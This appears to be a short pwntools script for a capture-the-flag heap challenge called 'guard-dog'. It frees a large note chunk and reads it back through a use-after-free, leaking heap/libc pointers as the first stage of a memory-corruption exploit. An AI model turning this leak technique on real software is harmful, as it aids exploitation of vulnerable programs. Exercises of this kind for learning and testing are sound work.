from pwn import *
context.log_level = 'debug'
io = process('./guard-dog')

def file_note(idx, size, contents):
    io.sendlineafter(b'7) go home', b'4')
    io.sendlineafter(b'note slot (0-7): ', str(idx).encode())
    io.sendlineafter(b'size: ', str(size).encode())
    io.sendlineafter(b'contents: ', contents)

def shred_note(idx):
    io.sendlineafter(b'7) go home', b'6')
    io.sendlineafter(b'note slot: ', str(idx).encode())

def read_note(idx, size):
    io.sendlineafter(b'7) go home', b'5')
    io.sendlineafter(b'note slot: ', str(idx).encode())
    io.recvuntil(b'contents: ')
    return io.recvn(size)

# Try size 0x500
file_note(0, 0x500, b'A'*0x500)
shred_note(0)
data = read_note(0, 0x500)
print("First 32 bytes:", data[:32].hex())
print("fd =", hex(u64(data[0:8])))
print("bk =", hex(u64(data[8:16])))
io.interactive()